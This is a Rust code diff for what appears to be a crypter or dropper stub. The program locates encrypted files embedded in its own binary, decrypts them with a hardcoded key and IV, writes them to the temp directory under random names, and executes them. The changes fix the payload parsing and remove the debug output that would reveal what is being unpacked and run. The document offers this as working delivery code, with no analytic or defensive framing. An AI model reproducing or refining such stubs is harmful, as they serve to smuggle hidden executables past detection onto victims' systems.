@@ -9,7 +9,8 @@ struct EncryptedFile {
 }
 
 fn parse_stub(binary: &[u8]) -> Option<Vec<u8>> {
-    let symbol_array_index = binary.windows(SYMBOL_ARRAY.len()).position(|window| window == SYMBOL_ARRAY);
+    let symbol_array_index = binary.windows(SYMBOL_ARRAY.len())
+        .rposition(|window| window == SYMBOL_ARRAY);
 
     if let Some(index) = symbol_array_index {
         let data = &binary[index + SYMBOL_ARRAY.len()..];
@@ -26,7 +27,7 @@ struct BinaryReader {
 
 impl BinaryReader {
     fn new(binary: Vec<u8>) -> Self {
-        Self { binary, pointer: RefCell::new(1) }
+        Self { binary, pointer: RefCell::new(0) }
     }
 
     fn read(&self, size: usize) -> Result<&[u8]> {
@@ -46,13 +47,10 @@ impl BinaryReader {
         while let Ok(extension_len) = self.read(1) {
             // Read extension
             let extension_len = u8::from_le_bytes(extension_len.try_into()?);
-            println!("Extension length: {}", extension_len);
             let extension = match self.read(extension_len as usize) {
                 Ok(extension) => String::from_utf8(extension.to_vec())?,
                 Err(_) => break,
             };
-
-            println!("Extension: {}", extension);
 
             // Read encrypted content
             let encrypted_len = u64::from_le_bytes(self.read(8)?.try_into()?);
@@ -75,18 +73,20 @@ fn main() -> Result<()> {
     let self_path = std::env::current_exe()?;
     let self_binary = fs::read(self_path)?;
     
-    let encrypted_data = parse_stub(&self_binary).ok_or(anyhow::anyhow!("Failed to parse stub"))?;
-    let encrypt_type = EncryptType::from(encrypted_data[0]);
-    println!("Encryption type: {:?}", encrypt_type);
+    let mut stub_data = parse_stub(&self_binary).ok_or(anyhow::anyhow!("Failed to parse stub"))?;
 
-    let reader = BinaryReader::new(encrypted_data);
+    let encrypt_type = EncryptType::from(stub_data[0]);
+
+    // Remove encryption type from encrypted data
+    stub_data.remove(0);
+
+    let reader = BinaryReader::new(stub_data);
     let encrypted_files = reader.get_encrypted_files()?;
 
     let decrypter = Decrypter::new(encrypt_type, KEY, IV);
     for file in encrypted_files {
         // Add file to temp directory
         let temp_path = std::env::temp_dir().join(format!("{}.{}", funny_word_generator(3), file.extension));
-        println!("Decrypting {} to {}", file.extension, temp_path.display());
         fs::write(temp_path.clone(), decrypter.decrypt_data(file.encrypted_content)?.to_vec())?;
 
         let _ = std::process::Command::new(temp_path)
